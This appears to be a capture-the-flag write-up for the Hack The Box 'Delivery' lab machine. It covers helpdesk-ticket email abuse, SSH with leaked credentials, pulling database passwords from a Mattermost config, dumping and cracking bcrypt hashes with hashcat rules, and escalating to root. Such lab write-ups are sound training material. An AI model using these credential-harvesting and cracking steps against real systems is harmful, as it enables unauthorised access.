---
layout: post
title: HTB Machine - Delivery
subtitle: Writeup
cover-img: https://www.hackthebox.com/storage/avatars/c55af6eadd5b60bac831d73c1a951327.png
thumbnail-img: https://www.hackthebox.com/storage/avatars/c55af6eadd5b60bac831d73c1a951327.png
share-img: https://www.hackthebox.com/storage/avatars/c55af6eadd5b60bac831d73c1a951327.png
tags: [ HTB, Hack the Box,Web,Vulnerability Assessment,Common Applications,Outdated Software,Authentication,Impersonation,Weak Credentials,TicketTrick]
---

Linux Machine
```zsh
whatweb http://10.10.10.222
http://10.10.10.222 [200 OK] Country[RESERVED][ZZ], Email[jane@untitled.tld], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.222], JQuery, Script, Title[Welcome], nginx[1.14.2]
```

if we check the webpage it mentions 'check our helpdesk' when redirecting there the page is not recognize cause it cannot resolve. Add the address helpdesk.delivery.htb to our /etc/hosts and we should gain access. There is an option to open a ticket. 

test@test.com

6544929
6544929@delivery.htb

the message in slack mentions credentials. and also that the root has a pass set with a variation of PleaseSubscribe!
maildeliverer:Youve_G0t_Mail! 

lets ssh
```zsh
ssh maildeliverer@10.10.10.222
```
Set terminal and check release. Check privileges and sudo assigments.
export TERM=xterm
```zsh
lsb_release a

id

sudo -l
```
lets search for suid privileges. Nothing interesting her
```zsh
find \-perm -4000 2>/dev/null
```
If we try to find where the webpages are stored in the server perhaps we can check for passwords inside their config files. No luck there.
```zsh
find / -name tickets.php 2>/dev/null
/var/www/osticket/upload/tickets.php
/var/www/osticket/upload/scp/tickets.php

grep -r -i password | less -s
```
we have also the chat service, we can check it as well. First we can find from where is running and then check the folder for any config file. 
```zsh
ps -faux | grep -i mattermost

cd /opt/mattermost/config

cat config.json 
"SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)
```        
Some credentials for an sql server are found. 
```zsh
mysql -u mmuser -p

show databases;
use mattermost
show tables;
show Users;
describe Users;
select Username,Password from Users;
```
We have now a hash for root. To determine the hash we can check the examples from hashcat or a hash identifier.
```zsh
hashcat --example-hashes | grep '$2a' -B 15
```
We determine that the method will be then 3200 for Bcrypt.
```zsh
hashcat -m 3200 -a 0 hash rockyou.txt
```
It wont crack it so the password is not contained in rockyou.txt. In the mattermost chat we read that there is a password that is not contained in rockyou but it is a variation of a word. We can use hashcat to generate passwords with that root of word. We place our root word in a file pwd and then use a rule from hashcat (there are more than 1 available). After that we will use or newly created dictionary to crack the password.
```zsh
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule pwd > pwd2

hashcat -m 3200 -a 0 hash pwd2

PleaseSubscribe!21
```
we cannot ssh with the root user cause it is not allowed. We need to change from the current user we have to root with the password and from there retrieve the flag.
```zsh
su root

cat /etc/ssh/sshd_config | grep -i permit
#PermitRootLogin prohibit-password
PermitRootLogin no
#PermitEmptyPasswords no
# the setting of "PermitRootLogin without-password".
#PermitTTY yes
#PermitUserEnvironment no
#PermitTunnel no
#	PermitTTY no
```
